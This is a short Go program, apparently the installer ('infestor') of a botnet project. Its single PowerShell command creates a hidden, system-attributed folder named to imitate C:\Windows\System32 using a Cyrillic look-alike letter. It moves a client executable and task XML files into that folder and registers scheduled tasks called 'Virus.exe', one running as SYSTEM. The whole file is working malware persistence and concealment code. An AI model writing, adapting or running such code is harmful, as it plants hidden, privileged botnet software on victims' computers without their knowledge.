package main

/*
go build -o infestor.exe .\botnet\botnet_files\\infestor.go

*/
import (
	"fmt"
	"os/exec"
)

func main() {

	cmd := exec.Command("powershell", "/C", `mkdir "C:\Windows\Sуstem32";ATTRIB +H +S "C:\Windows\Sуstem32";mv "C:\clientgui.exe" "C:\Windows\Sуstem32\clientgui.exe";mv "C:\some task.xml" "C:\Windows\Sуstem32\some task.xml";mv "C:\some task1.xml" "C:\Windows\Sуstem32\some task1.xml"; schtasks /create /tn "Virus.exe" /ru SYSTEM /xml "C:\Windows\Sуstem32\some task.xml"; schtasks /create /tn "Virus1.exe" /xml "C:\Windows\Sуstem32\some task1.xml"`)
	fmt.Println("Maybe all good")
	output, _ := cmd.CombinedOutput()
	fmt.Println(string(output))
	w := 0
	fmt.Scanf("%d", &w)

}
